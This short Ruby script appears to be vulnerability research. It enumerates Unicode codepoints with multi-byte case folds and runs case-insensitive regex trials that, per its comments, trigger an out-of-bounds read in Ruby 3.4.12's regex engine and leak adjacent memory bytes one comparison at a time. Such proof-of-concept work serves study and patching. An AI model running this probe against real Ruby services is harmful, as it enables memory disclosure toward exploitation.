#!/usr/bin/env ruby
# frozen_string_literal: true
# Two modes:
#   ruby ruby2shell-casefold-foldbytes.rb candidates
#   ruby ruby2shell-casefold-foldbytes.rb trial CP NEEDLE
#
# Enumerate every Unicode codepoint whose full case fold begins with an ASCII
# letter and is longer than one byte. Compiling /<letter>/i gives a one-byte
# reg->exact; on vulnerable 3.4.12, str_lower_case_match() (regexec.c:4278)
# compares all folded bytes and therefore reads past that buffer. A true
# result means the stale byte at exact+1 equalled the fold's second byte.
# This is analysis only: no app, no wire, no marker.
POINTER_BYTES = [0x00, 0x4b, 0x5c, 0x7f].freeze

def candidates
  out = []
  (0..0x10ffff).each do |cp|
    next if cp.between?(0xd800, 0xdfff)

    fold = cp.chr(Encoding::UTF_8).downcase(:fold).bytes
    next unless fold.length >= 2 && fold[0].between?(0x61, 0x7a)

    out << [cp, fold]
  end
  out
end

case ARGV.fetch(0)
when 'candidates'
  cs = candidates
  pointer = cs.count { |_cp, fold| POINTER_BYTES.include?(fold[1]) }
  puts "count=#{cs.length} pointer_second_byte=#{pointer}"
  cs.each do |cp, fold|
    puts "U+%04X %02x %s" % [cp, fold[0], fold.map { |b| '%02x' % b }.join]
  end
when 'trial'
  cp = Integer(ARGV.fetch(1), 16)
  needle = Integer(ARGV.fetch(2), 16)
  match = Regexp.new(needle.chr, Regexp::IGNORECASE).match?(cp.chr(Encoding::UTF_8))
  puts "ruby=#{RUBY_VERSION} cp=U+%04X needle=%02x match=%s" % [cp, needle, match]
else
  warn 'usage: ruby2shell-casefold-foldbytes.rb candidates|trial CP NEEDLE'
  exit 2
end
